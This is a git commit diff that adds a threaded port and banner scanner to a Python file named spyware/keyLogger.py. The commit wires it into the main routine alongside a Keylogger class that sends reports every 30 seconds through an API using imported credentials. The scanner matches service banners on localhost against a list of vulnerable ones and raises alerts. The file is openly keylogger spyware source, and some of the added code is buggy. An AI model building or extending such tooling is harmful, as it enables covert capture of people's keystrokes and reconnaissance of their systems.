d10c60dc9345d66593b62f7a12f52e3e0829669c
Darlan Noetzold <41628589+DarlanNoetzold@users.noreply.github.com>
2022-08-27 09:56:18 -0300

    Port Scanner

--- spyware/keyLogger.py
+++ spyware/keyLogger.py
@@ -10,6 +10,8 @@ import psutil as ps                         # For process
 import time                                 # For API
 import credenciais as cr                    # For API
 import threading
+import socket
+from IPy import IP
 
 SEND_REPORT_EVERY = 30
 
@@ -153,7 +155,56 @@ class Keylogger:
         keyboard.wait()
 
 
+class Scanner:
+    def __init__(self):
+        self.ports = []  # to store open port
+        self.banners = []  # to store open port banner
+        self.log =''
+
+    def banner(s):
+        return s.recv(1024)
+    def port_scanner(self, target, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            try:
+                target_ip = IP(target)  # check if target is an IP address
+            except:
+                target_ip = socket.gethostbyname(target)  # check if the target is a domain name or locahost
+
+            s.connect((target_ip, port))
+            try:
+                # get banner name
+                banner_name = self.banner(s).decode()
+                self.ports.append(port)
+
+                # store banner_name in banners list
+                self.banners.append(banner_name.strip())
+            except:
+                pass
+        except:
+            pass
+
+    # get the banner name
+
+    def scan(self):
+        for port in range(1, 5051):
+            while threading.active_count() > 150:
+                time.sleep(0.01)
+            thread = threading.Thread(target=self.port_scanner, args=["localhost", port])
+            thread.start()
+
+        with open("vulnarable_banners.txt", "r") as file:
+            data = file.read()
+            for i in range(len(self.banners)):
+                if self.banners[i] in data:
+                    self.log = f"[!]Vulneribility found: {self.banners[i]} at port {self.ports[i]}"
+                    sendAlert(self)
+
+
 if __name__ == "__main__":
     threading.Thread(target=block_DNS()).start()
+    scanner = Scanner()
+    threading.Thread(scanner.scan()).start()
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
